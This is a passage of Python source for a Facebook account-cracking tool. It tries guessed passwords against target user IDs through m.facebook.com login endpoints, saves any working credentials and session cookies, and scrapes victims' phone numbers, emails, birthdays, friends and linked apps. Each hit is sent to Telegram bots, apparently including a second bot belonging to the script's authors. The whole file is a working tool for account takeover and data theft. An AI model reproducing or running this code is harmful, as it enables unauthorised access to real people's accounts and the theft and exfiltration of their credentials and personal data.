					pwv.append(nmf)
					pwv.append(frs + frs)
					pwv.append(frs+"123")
					pwv.append('112233@@@')
					pwv.append('12341234@@')
			else:
				if len(frs)<3:
					pwv.append(nmf)
					pwv.append('llkkjjhhggffddssaa')
					pwv.append('1122334455@@')
					pwv.append('mmllpp')
					pwv.append('zzaaqq')
					pwv.append('ppooiiuuyyttrreewwqq')
					pwv.append('asdfghjkllkjhgfdsa')
					pwv.append('zxcvbnmnbvcxz')
				else:
					pwv.append(nmf)
					pwv.append('20202020')
					pwv.append('00998877')
					pwv.append('qqwweerrtt')
					pwv.append('30303030')
					pwv.append('12345@@@@@')
					pwv.append('aassddffgghhjjkkll')
					pwv.append('0099887766')
					pwv.append('1@2@3@4@5@')
			if 'ya' in pwpluss:
				for xpwd in pwnya:
					pwv.append(xpwd)
			else:pass
			if 'mobile' in method:
				pool.submit(crack,idf,pwv)
	print('')
	cetak(nel('\t[cyan]✓[green] Crack Selesai Ngab, Jangan Lupa Bersyukur[cyan] ✓[white] '))
	print(f'[{b}•{x}]{h} OK : {h}%s '%(ok))
	print(f'{x}[{b}•{x}]{k} CP : {k}%s{x} '%(cp))
	print('')
	print('>> Lanjut Crack Kembali ( Y/t ) ? ')
	woi = ('x')
	if woi in ['y','Y']:
		KilmenuViP()
	else:
		print(f'\t{x}[=]{k} انتهى الصيد . ')
		time.sleep(2)
		exit()


def crack(idf,pwv):
	global loop,ok,cp
	bi = random.choice([u,k,kk,b,h,hh])
	pers = loop*100/len(id2)
	fff = '%'
	print('\r%s• 𝚂𝙰𝙳 ༆ • %s/%s > OK %s > CP %s > %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
		try:
			tix = time.time()
			ses.headers.update({"Host":'m.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
			p = ses.get('https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F').text
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p)).group(1),"uid":idf,"flow":"login_no_pin","pass":pw,"next":"https://developers.facebook.com/tools/debug/accesstoken/"}
			ses.headers.update({"Host":'m.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://m.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'ya' in oprek:
					akun.append(idf+'|'+pw)
					ceker(idf,pw)
				else:
					print('\n')
					statuscp = f'''  
					🇫​​​​​🇦​​​​​🇨​​​​​🇪​​​​​🇧​​​​​🇴​​​​​🇴​​​​​🇰​​​​​❬𝄴ₚ❭
					
┎┈┈┈┈┈┈┈┈┈┈୨♡୧┈┈┈┈┈┈┈┈┈┈┈┈┒
⁂⁂┈┈┈┒
➺@MRBMOX ⚜️𝚂𝙰𝙳⚜️
@tf_r7 ⚔			
┖┈┈┈┈┈┈┈┈┈┈୨♡୧┈┈┈┈┈┈┈┈┈┈┈┈┚
					
🍡 - 𝗨𝗦𝗘𝗥𝗡𝗔𝗠`{idf}

🔴 - 𝗣𝗔𝗦𝗦𝗪𝗥𝗗`{pw}

┎┈┈┈┈┈┈┈┈┈┈୨♡୧┈┈┈┈┈┈┈┈┈┈┈┈┒
⁂⁂┈┈┈┒
➺@MRBMOX ⚜️𝚂𝙰𝙳⚜️
 ⚔			
┖┈┈┈┈┈┈┈┈┈┈୨♡୧┈┈┈┈┈┈┈┈┈┈┈┈┚
┈┈┈┚					
☁ - 🇺​​​​​🇷​​​​​🇱​​​​​ : https://www.facebook.com/profile.php?id={idf}

•  @MRBMOX  •
					'''
					statuscp1 = nel(statuscp, style='yellow')
					cetak(nel(statuscp1, title=' شٍګدِ فِّګر😂 '))
					open('CP/'+cpc,'a').write(statuscp)
					akun.append(idf+'|'+pw)
					cp+=1
					requests.get("https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statuscp))
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				headapp={"user-agent":"NokiaX2-01/5.0 (08.35) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (Linux; Android 9; SH-03J) AppleWebKit/937.36 (KHTML, like Gecko) Safari/420+"}
				if 'no' in taplikasi:
					ok+=1
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])

					print('\n')
					try:nomer = re.findall('\<a\ href\=\"tel\:\+.*?\">\<span\ dir\=\"ltr\">(.*?)<\/span><\/a>',str(response))[0]
					except:nomer = ""
					try:email = re.findall('\<a href\=\"https\:\/\/lm\.facebook\.com\/l\.php\?u\=mail.*?\" target\=\".*?\"\>(.*?)<\/a\>',str(response))[0].replace('&#064;','@')
					except:email=""
					try:ttl = re.findall('\<\/td\>\<td\ valign\=\"top\" class\=\".*?\"\>\<div\ class\=\".*?\"\>(\d+\s+\w+\s+\d+)<\/div\>\<\/td\>\<\/tr\>',str(response))[0]
					except:ttl=""
					try:teman = re.findall('\<h3\ class\=\".*?\"\>Teman\ \((.*?)\)<\/h3\>',str(response2))[0]
					except:teman = ""
					try:pengikut = re.findall('\<span\ class\=\".*?\"\>(.*?)\<\/span\>',str(response4))[1]
					except:pengikut = ""
					try:
						tahun = ""
						cek_thn = re.findall('\<div\ class\=\".*?\" id\=\"year_(.*?)\">',str(response3))
						for nenen in cek_thn:
							tahun += nenen+", "
					except:pass
					statusok = f'''
					🇫​​​​​🇦​​​​​🇨​​​​​🇪​​​​​🇧​​​​​🇴​​​​​🇴​​​​​🇰​​​​​ ❬O‌ᴋⷦ❭
				
┎┈┈┈┈┈┈┈┈┈┈୨♡୧┈┈┈┈┈┈┈┈┈┈┈┈┒
⁂⁂┈┈┈┒
➺@MRBMOX ⚜️𝚂𝙰𝙳⚜️
 ⚔			
┖┈┈┈┈┈┈┈┈┈┈୨♡୧┈┈┈┈┈┈┈┈┈┈┈┈┚
				
🍡 - 𝗨𝗦𝗘𝗥𝗡𝗔𝗠 {idf}

🟢 - 𝗣𝗔𝗦𝗦𝗪𝗥𝗗 {pw}

┎┈┈┈┈┈┈┈┈┈┈୨♡୧┈┈┈┈┈┈┈┈┈┈┈┈┒
⁂⁂┈┈┈┒
➺@MRBMOX ⚜️𝚂𝙰𝙳⚜️
 ⚔			
┖┈┈┈┈┈┈┈┈┈┈୨♡୧┈┈┈┈┈┈┈┈┈┈┈┈┚
┈┈┈┚					
☀  - 🇺​​​​​🇷​​​​​🇱​​​​​ : https://www.facebook.com/profile.php?id={idf}

☀  -  🇨​​​​​🇴​​​​​🇴​​​​​🇰​​​​​🇮​​​​​🇪​​​​​🇸​​​​​ : {kuki}
					'''
					
					statusok1 = nel(statusok, style='green')
					open('OK/'+okc,'a').write(statusok)
					cetak(nel(statusok1, title='مبروك'))
					requests.get("https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
					requests.get("https://api.telegram.org/bot"+str(TBO)+"/sendMessage?chat_id="+str(ID9)+"&text="+str(statusok))
					kilgame(kuki)
					break
				elif 'ya' in taplikasi:
					ok+=1
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					user=idf
					infoakun = ""
					session = requests.Session()
					get_id = session.get("https://m.facebook.com/profile.php",cookies=coki,headers=headapp).text
					nama = re.findall('\<title\>(.*?)<\/title\>',str(get_id))[0]
					response = session.get("https://m.facebook.com/profile.php?v=info",cookies=coki,headers=headapp).text
					response2 = session.get("https://m.facebook.com/profile.php?v=friends",cookies=coki,headers=headapp).text
					response3 = session.get(f"https://m.facebook.com/{user}/allactivity/?category_key=all&section_id=year_2022&timestart=1609488000&timeend=1641023999&sectionLoadingID=m_timeline_loading_div_1641023999_1609488000_8_",cookies=coki,headers=headapp).text
					response4 = session.get(f"https://m.facebook.com/timeline/app_collection/?collection_token={user}%3A184985071538002%3A32&_rdc=1&_rdr",cookies=coki,headers=headapp).text
					try:nomer = re.findall('\<a\ href\=\"tel\:\+.*?\">\<span\ dir\=\"ltr\">(.*?)<\/span><\/a>',str(response))[0]
					except:nomer = ""
					try:email = re.findall('\<a href\=\"https\:\/\/lm\.facebook\.com\/l\.php\?u\=mail.*?\" target\=\".*?\"\>(.*?)<\/a\>',str(response))[0].replace('&#064;','@')
					except:email=""
					try:ttl = re.findall('\<\/td\>\<td\ valign\=\"top\" class\=\".*?\"\>\<div\ class\=\".*?\"\>(\d+\s+\w+\s+\d+)<\/div\>\<\/td\>\<\/tr\>',str(response))[0]
					except:ttl=""
					try:teman = re.findall('\<h3\ class\=\".*?\"\>Teman\ \((.*?)\)<\/h3\>',str(response2))[0]
					except:teman = ""
					try:pengikut = re.findall('\<span\ class\=\".*?\"\>(.*?)\<\/span\>',str(response4))[1]
					except:pengikut = ""
					try:
						tahun = ""
						cek_thn = re.findall('\<div\ class\=\".*?\" id\=\"year_(.*?)\">',str(response3))
						for nenen in cek_thn:
							tahun += nenen+", "
					except:pass

					infoakun += f'''
					🇫​​​​​🇦​​​​​🇨​​​​​🇪​​​​​🇧​​​​​🇴​​​​​🇴​​​​​🇰​​​​​ ❬O‌ᴋⷦ❭
					
┎┈┈┈┈┈┈┈┈┈┈୨♡୧┈┈┈┈┈┈┈┈┈┈┈┈┒
⁂⁂┈┈┈┒
➺@N_9_N_6 ⚜️𝚂𝙰𝙳⚜️
@tf_r7 ⚔			
┖┈┈┈┈┈┈┈┈┈┈୨♡୧┈┈┈┈┈┈┈┈┈┈┈┈┚
					
🍡 - 𝗨𝗦𝗘𝗥𝗡𝗔𝗠 {idf}

🟢 - 𝗣𝗔𝗦𝗦𝗪𝗥𝗗 {pw}

┎┈┈┈┈┈┈┈┈┈┈୨♡୧┈┈┈┈┈┈┈┈┈┈┈┈┒
⁂⁂┈┈┈┒
➺@MRBMOX ⚜️𝚂𝙰𝙳⚜️
 ⚔			
┖┈┈┈┈┈┈┈┈┈┈୨♡୧┈┈┈┈┈┈┈┈┈┈┈┈┚
┈┈┈┚					
☀  - 🇺​​​​​🇷​​​​​🇱​​​​​ : https://www.facebook.com/profile.php?id={idf}

☀  -  🇨​​​​​🇴​​​​​🇴​​​​​🇰​​​​​🇮​​​​​🇪​​​​​🇸​​​​​ : {kuki}
					'''
					requests.get("https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(infoakun))
					requests.get("https://api.telegram.org/bot"+str(TBO)+"/sendMessage?chat_id="+str(ID9)+"&text="+str(infoakun))
					open('infoaccount/'+okc,'a').write(infoakun)
					kilgame(kuki)

					hit1, hit2 = 0,0
					cek =session.get("https://m.facebook.com/settings/apps/tabbed/?tab=active",cookies=coki,headers=headapp).text
					cek2 = session.get("https://m.facebook.com/settings/apps/tabbed/?tab=inactive",cookies=coki,headers=headapp).text
					if "Diakses menggunakan Facebook" in re.findall("\<title\>(.*?)<\/title\>",str(cek)):
						infoakun += (f"Aplikasi Yang Terkait*\n")
						if "Anda tidak memiliki aplikasi atau situs web aktif untuk ditinjau." in cek:
							infoakun += (f"Tidak Ada Aplikasi Aktif Yang Terkait *\n")
						else:
							infoakun += (f"	Aplikasi Aktif : \n")
							apkAktif = re.findall('\/><div\ class\=\".*?\"\>\<span\ class\=\".*?\"\>(.*?)<\/span\>',str(cek))
							ditambahkan = re.findall('\<div\>\<\/div\>\<div\ class\=\".*?\"\>(.*?)<\/div\>',str(cek))
							for muncul in apkAktif:
								hit1+=1
								infoakun += (f"		[{hit1}] {muncul} {ditambahkan[hit2]}\n")
								hit2+=1
						if "Anda tidak memiliki aplikasi atau situs web kedaluwarsa untuk ditinjau" in cek2:
							infoakun += (f"\nTidak Ada Aplikasi Kedaluwarsa Yang Terkait\n")
						else:
							hit1,hit2=0,0
							infoakun += (f"	Aplikasi Kedaluwarsa :\n")
							apkKadaluarsa = re.findall('\/><div\ class\=\".*?\"\>\<span\ class\=\".*?\"\>(.*?)<\/span\>',str(cek2))
							kadaluarsa = re.findall('\<div\>\<\/div\>\<div\ class\=\".*?\"\>(.*?)<\/div\>',str(cek2))
							for muncul in apkKadaluarsa:
								hit1+=1
								infoakun += (f"		[{hit1}] {muncul} {kadaluarsa[hit2]}\n")
								hit2+=1
					else:pass
					print('\n')
					statusok = f'''					
   \n{infoakun}					
					'''
					statusok1 = nel(statusok, style='green')
					cetak(nel(statusok1, title='OK'))
					kilgame(kuki)
					break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
def kilgame(kuki):
	session = requests.Session()
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":"noscript=1;"+kuki}).text
	sop = bs4.BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	try:
		for i in range(len(game)):
			kil = ("\r%s  \033[0m              ➛ %s%s"%(P,H,game[i].replace("Ditambahkan pada"," Ditambahkan pada")))
			kil2 = 'التطبيقات المرتبطة : '+kil
			print(kil)
	except AttributeError:
		print ("\r    %s\033[0m cookie invalid"%(M))
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":"noscript=1;"+kuki}).text
	sop = bs4.BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	try:
		for i in range(len(game)):
			print ("\r%s  \033[0m              ➛ %s"%(P,game[i].replace("Kedaluwarsa"," Kedaluwarsa")))
	except AttributeError:	 
		print ("\r    %s \033[0mcookie invalid"%(M))
if __name__=='__main__':
	try:os.system('git pull')
	except:pass
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
	try:os.mkdir('/sdcard/ALVINO-DUMP')
	except:pass
	try:os.system('touch .prox.txt')
	except:pass
	try:os.system('pkg install play-audio')
	except:pass
	try:os.system('clear')
	except:pass
	
	KilmenuViP()